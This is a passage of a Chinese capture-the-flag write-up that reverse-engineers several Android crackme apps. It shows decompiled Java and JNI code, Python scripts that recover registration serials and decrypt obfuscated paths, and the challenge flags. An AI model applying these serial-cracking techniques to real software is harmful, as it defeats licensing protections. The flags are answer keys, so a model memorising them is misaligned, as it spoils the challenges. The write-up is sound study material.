0x3A, 0xA8, 0xC3, 0x20, 0x63, 0x89, 0xB7, 0xC0, 0x1C, 0x1D, 0x44, 0xC2, 0x28, 0x7F, 0xED, 0x02, 0x0E, 0x5D, 0x66, 0x8F, 0x98, 0xB5, 0xB7, 0xD0, 0x16, 0x4D, 0x83, 0xF8, 0xFB, 0x01, 0x43, 0x47]key = &#39;Hello Ph0en1x&#39;l1 = len(key)l2 = len(data)for i in range(l2 - 1, 0, -1):    data[i] = (((data[i] + 1 - data[i - 1]) ^ ord(key[i % l1])) &amp; 0xFF) - 1data[0] = (data[0] ^ 0x48) - 1flag = &#39;&#39;.join([chr(c + 1) for c in data])print flag# flag{Ar3_y0u_go1nG_70_scarborough_Fair}</code></pre><h1 id="RememberOther"><a href="#RememberOther" class="headerlink" title="RememberOther"></a>RememberOther</h1><p>这道题简直出的莫名其妙，发现如果用户名和密码都为空会返回 True，并且会弹出 strings.xml 中指向的 successed 字符串：</p><pre><code class="java">package com.droider.crackme0201;import android.app.Activity;import android.os.Bundle;import android.support.v4.view.MotionEventCompat;import android.view.Menu;import android.view.View;import android.view.View.OnClickListener;import android.widget.Button;import android.widget.EditText;import android.widget.Toast;import java.security.MessageDigest;import java.security.NoSuchAlgorithmException;public class MainActivity extends Activity {    private Button btn_register;    private EditText edit_sn;    private EditText edit_userName;    public void onCreate(Bundle savedInstanceState) {        super.onCreate(savedInstanceState);        setContentView(R.layout.activity_main);        setTitle(R.string.unregister);        this.edit_userName = (EditText) findViewById(R.id.edit_username);        this.edit_sn = (EditText) findViewById(R.id.edit_sn);        this.btn_register = (Button) findViewById(R.id.button_register);        this.btn_register.setOnClickListener(new OnClickListener() {            public void onClick(View v) {                if (MainActivity.this.checkSN(MainActivity.this.edit_userName.getText().toString().trim(), MainActivity.this.edit_sn.getText().toString().trim())) {                    Toast.makeText(MainActivity.this, R.string.successed, 0).show();                    MainActivity.this.btn_register.setEnabled(false);                    MainActivity.this.setTitle(R.string.registered);                    return;                }                Toast.makeText(MainActivity.this, R.string.unsuccessed, 0).show();            }        });    }    public boolean onCreateOptionsMenu(Menu menu) {        getMenuInflater().inflate(R.menu.activity_main, menu);        return true;    }    private boolean checkSN(String userName, String sn) {        try {            if (userName.length() == 0 &amp;&amp; sn.length() == 0) {                return true;            }            if (userName == null || userName.length() == 0) {                return false;            }            if (sn == null || sn.length() != 16) {                return false;            }            MessageDigest digest = MessageDigest.getInstance(&quot;MD5&quot;);            digest.reset();            digest.update(userName.getBytes());            String hexstr = toHexString(digest.digest(), BuildConfig.FLAVOR);            StringBuilder sb = new StringBuilder();            for (int i = 0; i &lt; hexstr.length(); i += 2) {                sb.append(hexstr.charAt(i));            }            if (sb.toString().equalsIgnoreCase(sn)) {                return true;            }            return false;        } catch (NoSuchAlgorithmException e) {            e.printStackTrace();            return false;        }    }    private static String toHexString(byte[] bytes, String separator) {        StringBuilder hexString = new StringBuilder();        for (byte b : bytes) {            String hex = Integer.toHexString(b &amp; MotionEventCompat.ACTION_MASK);            if (hex.length() == 1) {                hexString.append(&#39;0&#39;);            }            hexString.append(hex).append(separator);        }        return hexString.toString();    }}</code></pre><p>在资源中找到指定的字符串：</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;resources&gt;    &lt;string name=&quot;app_name&quot;&gt;Crackme0201&lt;/string&gt;    &lt;string name=&quot;hint_sn&quot;&gt;请输入16位的注册码&lt;/string&gt;    &lt;string name=&quot;hint_username&quot;&gt;请输入用户名&lt;/string&gt;    &lt;string name=&quot;info&quot;&gt;Xman Android&lt;/string&gt;    &lt;string name=&quot;menu_settings&quot;&gt;Settings&lt;/string&gt;    &lt;string name=&quot;register&quot;&gt;注 册&lt;/string&gt;    &lt;string name=&quot;registered&quot;&gt;程序已注册&lt;/string&gt;    &lt;string name=&quot;sn&quot;&gt;注册码：&lt;/string&gt;    &lt;string name=&quot;successed&quot;&gt;md5:b3241668ecbeb19921fdac5ac1aafa69&lt;/string&gt;    &lt;string name=&quot;title_activity_main&quot;&gt;Crackme&lt;/string&gt;    &lt;string name=&quot;unregister&quot;&gt;程序未注册&lt;/string&gt;    &lt;string name=&quot;unsuccessed&quot;&gt;无效用户名或注册码&lt;/string&gt;    &lt;string name=&quot;username&quot;&gt;用户名：&lt;/string&gt;&lt;/resources&gt;</code></pre><p>搜一下 MD5，得到原字符串为 <code>YOU_KNOW_</code>。但结果不对，网上找到别人的 wp，说另一半要结合 word 中的提示，出题人说他不懂安卓，那么我们就懂了，flag 就是 <code>YOU_KNOW_ANDROID</code>。</p><h1 id="黑客精神"><a href="#黑客精神" class="headerlink" title="黑客精神"></a>黑客精神</h1><p>这题相比前面的题目开始复杂起来了。在 MainActivity 中，看到一开始对一个 m 的值进行了判断。然后接下来在 onClick 中新建了一个 MyApp 实例，如果 m 为 0 就调用 doRegister 函数，其中跳转到 RegActivity。</p><pre><code class="java">package com.gdufs.xman;import android.app.Activity;import android.app.AlertDialog.Builder;import android.content.ComponentName;import android.content.DialogInterface;import android.content.Intent;import android.os.Bundle;import android.os.Process;import android.util.Log;import android.view.Menu;import android.view.View;import android.view.View.OnClickListener;import android.widget.Button;import android.widget.Toast;public class MainActivity extends Activity {    private static String workString;    private Button btn1;    public void onCreate(Bundle savedInstanceState) {        String str2;        super.onCreate(savedInstanceState);        setContentView(R.layout.activity_main);        String str1 = &quot;Xman&quot;;        Log.d(&quot;com.gdufs.xman m=&quot;, str1);        MyApp myApp = (MyApp) getApplication();        int m = MyApp.m;        if (m == 0) {            str2 = &quot;\u672a\u6ce8\u518c&quot;; // 未注册        } else if (m == 1) {            str2 = &quot;\u5df2\u6ce8\u518c&quot;; // 已注册        } else {            str2 = &quot;\u5df2\u6df7\u4e71&quot;; // 已混乱        }        setTitle(str1 + str2);        this.btn1 = (Button) findViewById(R.id.button1);        this.btn1.setOnClickListener(new OnClickListener() {            public void onClick(View v) {                MyApp myApp = (MyApp) MainActivity.this.getApplication();                if (MyApp.m == 0) {                    MainActivity.this.doRegister();                    return;                }                ((MyApp) MainActivity.this.getApplication()).work();                Toast.makeText(MainActivity.this.getApplicationContext(), MainActivity.workString, 0).show();            }        });    }    public void doRegister() {        new Builder(this).setTitle(&quot;\u6ce8\u518c&quot;).setMessage(&quot;Flag\u5c31\u5728\u524d\u65b9\uff01&quot;).setPositiveButton(&quot;\u6ce8\u518c&quot;, new DialogInterface.OnClickListener() { // Title =&gt; 注册 | Message =&gt; Flag就在前方！ | PositiveButton =&gt; 注册            public void onClick(DialogInterface dialog, int which) {                Intent intent = new Intent();                intent.setComponent(new ComponentName(BuildConfig.APPLICATION_ID, &quot;com.gdufs.xman.RegActivity&quot;));                MainActivity.this.startActivity(intent); // 跳转到RegActivity                MainActivity.this.finish();            }        }).setNegativeButton(&quot;\u4e0d\u73a9\u4e86&quot;, new DialogInterface.OnClickListener() { // NagetiveButton =&gt; 不玩了            public void onClick(DialogInterface dialog, int which) {                Process.killProcess(Process.myPid());            }        }).show();    }    public void work(String str) {        workString = str;    }    public boolean onCreateOptionsMenu(Menu menu) {        getMenuInflater().inflate(R.menu.menu_main, menu);        return true;    }}</code></pre><p>然后看一下 MyApp 类中，发现分别有三个函数在 Native 层实现。其中 onCreate 中调用了 initSN 函数。SN 猜测是 Serial Number 即序列号：</p><pre><code class="java">package com.gdufs.xman;import android.app.Application;import android.util.Log;public class MyApp extends Application {    public static int m = 0;    public native void initSN();    public native void saveSN(String str);    public native void work();    static {        System.loadLibrary(&quot;myjni&quot;);    }    public void onCreate() {        initSN();        Log.d(&quot;com.gdufs.xman m=&quot;, String.valueOf(m));        super.onCreate();    }}</code></pre><p>RegActivity 中获取输入的字符串，并作为 SN 传入 saveSN 函数。然后 App 将会把自己的进程杀死：</p><pre><code class="java">package com.gdufs.xman;import android.app.Activity;import android.app.AlertDialog.Builder;import android.content.DialogInterface;import android.os.Bundle;import android.os.Process;import android.view.View;import android.view.View.OnClickListener;import android.widget.Button;import android.widget.EditText;import android.widget.Toast;public class RegActivity extends Activity {    private Button btn_reg;    private EditText edit_sn;    public void onCreate(Bundle savedInstanceState) {        super.onCreate(savedInstanceState);        setContentView(R.layout.activity_reg);        this.btn_reg = (Button) findViewById(R.id.button1);        this.edit_sn = (EditText) findViewById(R.id.editText1);        this.btn_reg.setOnClickListener(new OnClickListener() {            public void onClick(View v) {                String sn = RegActivity.this.edit_sn.getText().toString().trim();                if (sn == null || sn.length() == 0) {                    Toast.makeText(RegActivity.this, &quot;\u60a8\u7684\u8f93\u5165\u4e3a\u7a7a&quot;, 0).show(); // 您的输入为空                    return;                }                ((MyApp) RegActivity.this.getApplication()).saveSN(sn);                new Builder(RegActivity.this).setTitle(&quot;\u56de\u590d&quot;).setMessage(&quot;\u60a8\u7684\u6ce8\u518c\u7801\u5df2\u4fdd\u5b58&quot;).setPositiveButton(&quot;\u597d\u5427&quot;, new DialogInterface.OnClickListener() { // Title =&gt; 回复 | Message =&gt; 您的注册码已保存 | PositiveButton =&gt; 好吧                    public void onClick(DialogInterface dialog, int which) {                        Process.killProcess(Process.myPid());                    }                }).show();            }        });    }}</code></pre><p>那么基本上就是求出正确的 SN 了。在 Native 查看，发现函数在 JNI_OnLoad 中动态注册：</p><pre><code class="cpp">signed int __fastcall JNI_OnLoad(_JavaVM *a1){  if ( a1-&gt;functions-&gt;GetEnv(&amp;a1-&gt;functions, (void **)&amp;g_env, 65542) )    return -1;  _android_log_print(2, &quot;com.gdufs.xman&quot;, &quot;JNI_OnLoad()&quot;);  native_class = (int)g_env-&gt;functions-&gt;FindClass(&amp;g_env-&gt;functions, &quot;com/gdufs/xman/MyApp&quot;);  if ( !g_env-&gt;functions-&gt;RegisterNatives(&amp;g_env-&gt;functions, (jclass)native_class, (const JNINativeMethod *)gMethods, 3) )// register 3 methods  {    _android_log_print(2, &quot;com.gdufs.xman&quot;, &quot;RegisterNatives() --&gt; nativeMethod() ok&quot;);    return 65542;  }  _android_log_print(6, &quot;com.gdufs.xman&quot;, &quot;RegisterNatives() --&gt; nativeMethod() failed&quot;);  return -1;}</code></pre><p>先来看 initSN，其中读取 <code>/sdcard/reg.dat</code> 中的内容并和 <code>EoPAoY62@ElRD</code> 进行比较：</p><pre><code class="cpp">void __fastcall initSN(_JNIEnv *a1){  _JNIEnv *env; // r6  FILE *f; // r0  FILE *f_1; // r4  _JNIEnv *env_1; // r0  int v5; // r1  int len; // r7  char *data; // r5  _JNIEnv *env_2; // r0  int v9; // r1  env = a1;  f = fopen(&quot;/sdcard/reg.dat&quot;, &quot;r+&quot;);  f_1 = f;  if ( !f )                                     // read file error  {    env_1 = env;    v5 = (int)f_1;LABEL_5:    setValue(env_1, v5);    return;  }  fseek(f, 0, 2);                               // seek to file end ( SEEK_END )  len = ftell(f_1);  data = (char *)malloc(len + 1);               // malloc error  if ( !data )  {    fclose(f_1);    env_1 = env;    v5 = 0;    goto LABEL_5;  }  fseek(f_1, 0, 0);                             // seek to file start ( SEEK_SET )  fread(data, len, 1u, f_1);  data[len] = 0;  if ( !strcmp(data, &quot;EoPAoY62@ElRD&quot;) )  {    env_2 = env;    v9 = 1;  }  else  {    env_2 = env;    v9 = 0;  }  setValue(env_2, v9);  j_fclose(f_1);}</code></pre><p>其中看到有一个 setValue 函数，将 m 的值设为指定的值：</p><pre><code class="cpp">void __fastcall setValue(_JNIEnv *a1, int val){  int val_1; // r7  _JNIEnv *v3; // r4  jclass v4; // r0  void *v5; // r5  struct _jfieldID *v6; // r0  val_1 = val;  v3 = a1;  v4 = a1-&gt;functions-&gt;FindClass(&amp;a1-&gt;functions, &quot;com/gdufs/xman/MyApp&quot;);  v5 = v4;  v6 = v3-&gt;functions-&gt;GetStaticFieldID(&amp;v3-&gt;functions, v4, &quot;m&quot;, &quot;I&quot;);  v3-&gt;functions-&gt;SetStaticIntField(&amp;v3-&gt;functions, v5, v6, val_1);// set m = val}</code></pre><p>接下来看 saveSN，这里做一个循环，将 reg.dat 中的字符串取出来并和 key 进行异或：</p><pre><code class="cpp">int __fastcall saveSN(_JNIEnv *a1, int a2, jstring a3){  _JNIEnv *env; // r6  jstring str; // r9  FILE *v5; // r7  int *v7; // r4  const char *v8; // r3  int v9; // r0  int v10; // r1  _WORD *v11; // r5  JNIEnv *v12; // r0  int i; // r4  const struct JNINativeInterface *v14; // r3  signed int j; // r6  const char *utf_string; // r9  const char *data; // r5  signed int len; // r10  char val; // r2  char tmp; // r3  int v21; // [sp+0h] [bp-38h]  int v22; // [sp+14h] [bp-24h]  char v23; // [sp+18h] [bp-20h]  env = a1;  str = a3;  f = fopen(&quot;/sdcard/reg.dat&quot;, &quot;w+&quot;);  if ( f )  {    v7 = &amp;v21;    v8 = &quot;W3_arE_whO_we_ARE&quot;;    do    {      v9 = *(_DWORD *)v8;      v8 += 8;      v10 = *((_DWORD *)v8 - 1);      *v7 = v9;      v7[1] = v10;      v11 = v7 + 2;      v7 += 2;    }    while ( v8 != &quot;E&quot; );    v12 = &amp;env-&gt;functions;    i = 2016;    *v11 = *(_WORD *)v8;    v14 = env-&gt;functions;    j = 0;    utf_string = v14-&gt;GetStringUTFChars(v12, str, 0);    data = utf_string;    len = strlen(utf_string);    while ( j &lt; len )    {      if ( j % 3 == 1 )      {        i = (i + 5) % 16;        val = *(&amp;v23 + i - 23);                 // &amp;v23 - 32 = &amp;&quot;3_arE_whO_we_ARE&quot;      }      else if ( j % 3 == 2 )      {        i = (i + 7) % 15;        val = *(&amp;v23 + i - 22);                 // &amp;v23 - 22 = &amp;&quot;_arE_whO_we_ARE&quot;      }      else      {        i = (i + 3) % 13;        val = *(&amp;v23 + i - 21);                 // &amp;v23 - 21 = &amp;&quot;arE_whO_we_ARE&quot;      }      tmp = *data;      ++j;      *((_BYTE *)++data - 1) = tmp ^ val;    }    fputs(utf_string, f);  }  else if ( v22 == _stack_chk_guard )  {    return j___android_log_print(3, &quot;com.gdufs.xman&quot;, &amp;unk_2DCA);  }  return j_fclose(f);}</code></pre><p>work 函数中初始化了 SN，获取了 m 的值，并最后调用 callWork：</p><pre><code class="cpp">void __fastcall work(_JNIEnv *a1){  _JNIEnv *env; // r4  jint m; // r0  _JNIEnv *env_1; // r0  void *v4; // r1  bool v5; // zf  env = a1;  initSN(a1);  m = getValue(env);  if ( m )  {    v5 = m == 1;    env_1 = env;    if ( v5 )      v4 = &amp;unk_2E6B;                           // [0xE8, 0xBE, 0x93, 0xE5, 0x85, 0xA5, 0xE5, 0x8D, 0xB3, 0xE6, 0x98, 0xAF, 0x66, 0x6C, 0x61, 0x67, 0x2C, 0xE6, 0xA0, 0xBC, 0xE5, 0xBC, 0x8F, 0xE4, 0xB8, 0xBA, 0x78, 0x6D, 0x61, 0x6E, 0x7B, 0xE2, 0x80, 0xA6, 0xE2, 0x80, 0xA6, 0x7D, 0xEF, 0xBC, 0x81]    else      v4 = &amp;unk_2E95;                           // [0xE7, 0x8A, 0xB6, 0xE6, 0x80, 0x81, 0xE4, 0xB8, 0x8D, 0xE5, 0xA4, 0xAA, 0xE5, 0xAF, 0xB9, 0xE3, 0x80, 0x82, 0xE3, 0x80, 0x82]  }  else  {    env_1 = env;    v4 = &amp;unk_2E5B;                             // [0xE8, 0xBF, 0x98, 0xE4, 0xB8, 0x8D, 0xE8, 0xA1, 0x8C, 0xE5, 0x91, 0xA2, 0xEF, 0xBC, 0x81]  }  callWork(env_1, (int)v4);}</code></pre><p>其中 getValue 就是获取 m 的值：</p><pre><code class="cpp">jint __fastcall getValue(_JNIEnv *a1){  _JNIEnv *v1; // r4  jclass v2; // r0  void *v3; // r5  struct _jfieldID *v4; // r0  v1 = a1;  v2 = a1-&gt;functions-&gt;FindClass(&amp;a1-&gt;functions, &quot;com/gdufs/xman/MyApp&quot;);  v3 = v2;  v4 = v1-&gt;functions-&gt;GetStaticFieldID(&amp;v1-&gt;functions, v2, &quot;m&quot;, &quot;I&quot;);  return v1-&gt;functions-&gt;GetStaticIntField(&amp;v1-&gt;functions, v3, v4);// get m&#39;s value}</code></pre><p>callWork 中就是调用了 work 函数，这样看来是个死循环：</p><pre><code class="cpp">void __fastcall callWork(_JNIEnv *a1, void *a2){  const char *v2; // r8  _JNIEnv *env; // r4  jclass v4; // r0  void *v5; // r5  struct _jmethodID *v6; // r0  jobject v7; // r7  struct _jmethodID *v8; // r5  void (*v9)(JNIEnv *, jobject, jmethodID, ...); // r6  jstring v10; // r0  v2 = (const char *)a2;  env = a1;  v4 = a1-&gt;functions-&gt;FindClass(&amp;a1-&gt;functions, &quot;com/gdufs/xman/MainActivity&quot;);  v5 = v4;  v6 = env-&gt;functions-&gt;GetMethodID(&amp;env-&gt;functions, v4, &quot;&lt;init&gt;&quot;, &quot;()V&quot;);  v7 = env-&gt;functions-&gt;NewObject(&amp;env-&gt;functions, v5, v6);  v8 = env-&gt;functions-&gt;GetMethodID(&amp;env-&gt;functions, v5, &quot;work&quot;, &quot;(Ljava/lang/String;)V&quot;);  if ( v8 )  {    v9 = env-&gt;functions-&gt;CallVoidMethod;    v10 = env-&gt;functions-&gt;NewStringUTF(&amp;env-&gt;functions, v2);    v9(&amp;env-&gt;functions, v7, v8, v10);  }}</code></pre><p>在 saveSN 中其实就是实际的算法，逆一下实现解 SN 脚本：</p><pre><code class="python">#!/usr/bin/env pythonciphertext = &#39;EoPAoY62@ElRD&#39;key = &#39;W3_arE_whO_we_ARE&#39;i = 2016j = 0l = len(ciphertext)result = &#39;&#39;while j &lt; l:    if j % 3 == 1:        i = (i + 5) % 16        val = ord(key[i + 1])    elif j % 3 ==2:        i = (i + 7) % 15        val = ord(key[i + 2])    else:        i = (i + 3) % 13        val = ord(key[i + 3])    result += chr(ord(ciphertext[j]) ^ val)    j += 1print result</code></pre><h1 id="easy-dex"><a href="#easy-dex" class="headerlink" title="easy-dex"></a>easy-dex</h1><p>首先查看 AndroidManifest.xml，发现启动 Activity 为 <code>android.app.NativeActivity</code>，是在 Native 层实现的安卓 Activity：</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;manifest android:versionCode=&quot;1&quot; android:versionName=&quot;1.0&quot; package=&quot;com.a.sample.findmydex&quot; platformBuildVersionCode=&quot;24&quot; platformBuildVersionName=&quot;7.0&quot; xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot;&gt;  &lt;uses-sdk android:minSdkVersion=&quot;19&quot; android:targetSdkVersion=&quot;24&quot; /&gt;  &lt;application android:allowBackup=&quot;false&quot; android:fullBackupContent=&quot;false&quot; android:hasCode=&quot;false&quot; android:icon=&quot;@mipmap/ic_launcher&quot; android:label=&quot;@string/app_name&quot; android:theme=&quot;@style/AppTheme&quot;&gt;    &lt;activity android:configChanges=&quot;0xa0&quot; android:label=&quot;@string/app_name&quot; android:name=&quot;android.app.NativeActivity&quot;&gt;      &lt;meta-data android:name=&quot;android.app.lib_name&quot; android:value=&quot;native&quot; /&gt;      &lt;intent-filter&gt;        &lt;action android:name=&quot;android.intent.action.MAIN&quot; /&gt;        &lt;category android:name=&quot;android.intent.category.LAUNCHER&quot; /&gt;      &lt;/intent-filter&gt;    &lt;/activity&gt;    &lt;activity android:name=&quot;com.a.sample.findmydex.MainActivity&quot;&gt;      &lt;intent-filter&gt;        &lt;action android:name=&quot;com.a.sample.findmydex.MAIN&quot; /&gt;        &lt;category android:name=&quot;android.intent.category.DEFAULT&quot; /&gt;      &lt;/intent-filter&gt;    &lt;/activity&gt;  &lt;/application&gt;&lt;/manifest&gt;</code></pre><p>看了一下 Java 只有一个类：</p><pre><code class="java">class Placeholder {    Placeholder() {        super();    }}</code></pre><p>先查看 NativeActivity 中的 onCreate 函数，其中在 pthread_create 里的第三个参数是对应的 MainActivity 的入口点，即 android_app_entry：</p><pre><code class="cpp">int __fastcall ANativeActivity_onCreate(_DWORD *a1, int a2, size_t a3){  _DWORD *v3; // r8  int savedState; // r10  size_t savedStateSize; // r9  int activity; // r0  __int64 v7; // r2  char *v8; // r5  void *v9; // r0  int *v10; // r0  char *v11; // r0  pthread_attr_t attr; // [sp+4h] [bp-30h]  v3 = a1;  savedState = a2;  savedStateSize = a3;  activity = *a1;  *(_DWORD *)(activity + 20) = sub_3000;  *(_DWORD *)activity = sub_305A;  *(_DWORD *)(activity + 4) = sub_3062;  *(_DWORD *)(activity + 8) = sub_306A;  *(_DWORD *)(activity + 12) = sub_30BE;  HIDWORD(v7) = sub_30EE;  *(_DWORD *)(activity + 16) = sub_30C6;  LODWORD(v7) = sub_30DE;  *(_DWORD *)(activity + 56) = sub_30CE;  *(_DWORD *)(activity + 60) = sub_30D6;  *(_QWORD *)(activity + 24) = v7;  *(_DWORD *)(activity + 40) = sub_30F4;  *(_DWORD *)(activity + 44) = sub_30FC;  *(_DWORD *)(activity + 48) = sub_3102;  v8 = (char *)malloc(0x94u);  _aeabi_memclr4();  *((_DWORD *)v8 + 3) = v3;  pthread_mutex_init((pthread_mutex_t *)(v8 + 64), 0);  pthread_cond_init((pthread_cond_t *)(v8 + 68), 0);  if ( savedState )  {    v9 = malloc(savedStateSize);    *((_DWORD *)v8 + 5) = v9;    *((_DWORD *)v8 + 6) = savedStateSize;    _aeabi_memcpy(v9, savedState, savedStateSize);  }  if ( pipe(&amp;attr.__align + 6) )  {    v10 = (int *)_errno();    v11 = strerror(*v10);    _android_log_print(6, &quot;threaded_app&quot;, &quot;could not create pipe: %s&quot;, v11);    v8 = 0;  }  else  {    *((_QWORD *)v8 + 9) = *((_QWORD *)&amp;attr.__align + 3);    pthread_attr_init(&amp;attr);    pthread_attr_setdetachstate(&amp;attr, 1);    pthread_create((pthread_t *)v8 + 20, &amp;attr, (void *(*)(void *))android_app_entry, v8);    pthread_mutex_lock((pthread_mutex_t *)(v8 + 64));    while ( !*((_DWORD *)v8 + 27) )      pthread_cond_wait((pthread_cond_t *)(v8 + 68), (pthread_mutex_t *)(v8 + 64));    pthread_mutex_unlock((pthread_mutex_t *)(v8 + 64));  }  v3[7] = v8;  return _stack_chk_guard - *(&amp;attr.__align + 8);}</code></pre><p>在 android_app_entry 中，在 android_app_destroy 上面可以找到对应的 MainActivity 函数：</p><pre><code class="cpp">int __fastcall android_app_entry(int a1){  int v1; // r4  int v2; // r1  int v3; // r5  int result; // r0  char v5; // [sp+8h] [bp-14h]  char v6; // [sp+Ah] [bp-12h]  int v7; // [sp+Ch] [bp-10h]  v1 = a1;  *(_DWORD *)(a1 + 16) = AConfiguration_new();  v2 = *(_DWORD *)(*(_DWORD *)(v1 + 12) + 32);  AConfiguration_fromAssetManager();  AConfiguration_getLanguage(*(_DWORD *)(v1 + 16), &amp;v6);  AConfiguration_getCountry(*(_DWORD *)(v1 + 16), &amp;v5);  *(_DWORD *)(v1 + 84) = 1;  *(_DWORD *)(v1 + 88) = v1;  *(_DWORD *)(v1 + 92) = sub_3344;  *(_DWORD *)(v1 + 96) = 2;  *(_DWORD *)(v1 + 100) = v1;  *(_DWORD *)(v1 + 104) = sub_3370;  v3 = ALooper_prepare(1);  ALooper_addFd(v3, *(_DWORD *)(v1 + 72), 1, 1, 0, v1 + 84);  *(_DWORD *)(v1 + 28) = v3;  pthread_mutex_lock((pthread_mutex_t *)(v1 + 64));  *(_DWORD *)(v1 + 108) = 1;  pthread_cond_broadcast((pthread_cond_t *)(v1 + 68));  pthread_mutex_unlock((pthread_mutex_t *)(v1 + 64));  j_android_main(v1);  android_app_destroy(v1);  pthread_mutex_lock((pthread_mutex_t *)(v1 + 64));  if ( *(_DWORD *)(v1 + 32) )    AInputQueue_detachLooper();  AConfiguration_delete(*(_DWORD *)(v1 + 16));  *(_DWORD *)(v1 + 116) = 1;  pthread_cond_broadcast((pthread_cond_t *)(v1 + 68));  pthread_mutex_unlock((pthread_mutex_t *)(v1 + 64));  result = _stack_chk_guard - v7;  if ( _stack_chk_guard == v7 )    result = 0;  return result;}</code></pre><p>进入 MainActivity 之后，一开始有一段异或的数据：</p><pre><code class="cpp">  *(_DWORD *)filename = 0x9D888DC6;  *(_DWORD *)&amp;filename[4] = 0x888DC688;  *(_DWORD *)&amp;filename[8] = 0x8AC6889D;  *(_DWORD *)&amp;filename[12] = 0x88C78486;  *(_DWORD *)&amp;filename[16] = 0x84889AC7;  *(_DWORD *)&amp;filename[20] = 0xC78C8599;  *(_DWORD *)&amp;filename[24] = 0x8D87808F;  *(_DWORD *)&amp;filename[28] = 0x8C8D9084;  *(_DWORD *)&amp;filename[32] = 0x808FC691;  *(_DWORD *)&amp;filename[36] = 0xC69A8C85;  *(_DWORD *)&amp;filename[40] = 0x9A88858A;  *(_DWORD *)&amp;filename[44] = 0xC79A8C9A;  *(_DWORD *)&amp;filename[48] = 0xE9918C8D;  filename[52] = 0;  *(_DWORD *)name = 0x9D888DC6;  *(_DWORD *)&amp;name[4] = 0x888DC688;  *(_DWORD *)&amp;name[8] = 0x8AC6889D;  *(_DWORD *)&amp;name[12] = 0x88C78486;  *(_DWORD *)&amp;name[16] = 0x84889AC7;  *(_DWORD *)&amp;name[20] = 0xC78C8599;  *(_DWORD *)&amp;name[24] = 0x8D87808F;  *(_DWORD *)&amp;name[28] = 0x8C8D9084;  *(_DWORD *)&amp;name[32] = 0x808FC691;  *(_DWORD *)&amp;name[36] = 0xC69A8C85;  *(_DWORD *)&amp;name[40] = 0x918C8D86;  name[46] = 0;  i = 1;  *(_WORD *)&amp;name[44] = 0xE9C6u;  filename[0] = 47;  do  {    filename[i] ^= 0xE9u;                       // filename = &#39;/data/data/com.a.sample.findmydex/files/classes.dex&#39;    ++i;  }  while ( i != 53 );  j = 1;  name[0] = 47;  do  {    name[j] ^= 0xE9u;                           // name = &#39;/data/data/com.a.sample.findmydex/files/odex/&#39;    ++j;  }  while ( j != 47 );</code></pre><p>解密一下，可以发现是生成目标 dex 文件和 odex 的路径：</p><pre><code class="python">#!/usr/bin/env pythondef word2bytes(w):    return [w &amp; 0xFF, (w &gt;&gt; 8) &amp; 0xFF, (w &gt;&gt; 16) &amp; 0xFF, w &gt;&gt; 24]def bytes2word(bs):    return bs[0] | bs[1] &lt;&lt; 8 | bs[2] &lt;&lt; 16 | bs[3] &lt;&lt; 24def words2byte(ws):    result = []    for w in ws:        temp = word2bytes(w)        for b in temp:            result.append(b)    return resultdef bytes2words(bs):    result = []    for i in range(len(bs) / 4):        temp = bytes2word(bs[4*i:4*i+4])        result.append(temp)    return resultfilename = [0x9D888DC6, 0x888DC688, 0x8AC6889D, 0x88C78486, 0x84889AC7, 0xC78C8599, 0x8D87808F, 0x8C8D9084, 0x808FC691, 0xC69A8C85, 0x9A88858A, 0xC79A8C9A, 0xE9918C8D]name = [0x9D888DC6, 0x888DC688, 0x8AC6889D, 0x88C78486, 0x84889AC7, 0xC78C8599, 0x8D87808F, 0x8C8D9084, 0x808FC691, 0xC69A8C85, 0x918C8D86, 0x0000E9C6]filename = words2byte(filename)name = words2byte(name)filename = chr(47) + &#39;&#39;.join(list(map(lambda c: chr(c ^ 0xE9), filename[1:])))name = chr(47) + &#39;&#39;.join(list(map(lambda c: chr(c ^ 0xE9), name[1:])))print filename# /data/data/com.a.sample.findmydex/files/classes.dexprint name# /data/data/com.a.sample.findmydex/files/odex/</code></pre><p>然后接下来，可以看到一些涉及到 OpenGL 库的函数：</p><pre><code class="cpp">...  _android_log_print(4, &quot;FindMyDex&quot;, &quot;Can you shake your phone 100 times in 10 seconds?&quot;);  v10 = 0;  do  {    while ( 1 )    {      v12 = 0;      if ( !v30 )        v12 = -1;      v13 = ALooper_pollAll(v12, 0, &amp;v25, &amp;v24);// get time      if ( v13 &gt;= 0 )        break;      if ( v30 )      {        v11 = v31 + 0.01;        if ( (float)(v31 + 0.01) &gt; 1.0 )          v11 = 0.0;        v31 = v11;        sub_2C14((int)&amp;v26);                    // OpenGL      }    }...int __fastcall sub_2C14(int a1){  int v1; // r4  int result; // r0  v1 = a1;  result = *(_DWORD *)(a1 + 20);  if ( !result )    return result;  glClearColor(    (float)*(signed int *)(v1 + 44) / (float)*(signed int *)(v1 + 32),// red    *(GLclampf *)(v1 + 40),                     // green    (float)*(signed int *)(v1 + 48) / (float)*(signed int *)(v1 + 36),// blue    1.0);  glClear(0x4000u);  result = j_eglSwapBuffers(*(_QWORD *)(v1 + 20), *(_QWORD *)(v1 + 20) &gt;&gt; 32);  return result;}</code></pre><p>这部分不去仔细看，可以直接根据 log 来判断程序的流程，可以判断出是要求在 10 秒内摇 100 次手机。在 <code>(times - 1) &lt;= 88</code> 处可以看到开始对数据进行解压缩处理。在后面 <code>times == 100</code>，可以判断是达到了 100 次后，开始对将数据输出到文件中：</p><pre><code class="cpp">...  _android_log_print(4, &quot;FindMyDex&quot;, &quot;Can you shake your phone 100 times in 10 seconds?&quot;);...            _android_log_print(4, &quot;FindMyDex&quot;, &quot;Oh yeah~ You Got it~ %d times to go~&quot;, 99 - v10);...        if ( (unsigned int)(times - 1) &lt;= 88 )        {          v10 = times;          v15 = times / 10;          if ( times % 10 == 9 )          {            v16 = size_1;            v17 = (signed int)size_1 / 10;            v18 = (v15 + 1) * ((signed int)size_1 / 10);            if ( (signed int)size_1 / 10 * v15 &lt; v18 )            {              v19 = &amp;data[v17 * v15];              do              {                --v17;                *v19++ ^= times;              }              while ( v17 );            }            if ( times == 89 )            {              while ( v18 &lt; (signed int)v16 )                data[v18++] ^= 0x59u;            }            v10 = times + 1;          }        }        if ( times == 100 )                     // reach the target        {          if ( (signed int)(time(0) - v6) &gt; 9 )          {            _android_log_print(4, &quot;FindMyDex&quot;, &quot;OH~ You are too slow. Please try again&quot;);            _aeabi_memcpy(data, &amp;data_1, size_1);            v10 = 0;          }          else          {            v20 = v6;            if ( uncompress(dest, &amp;destLen, 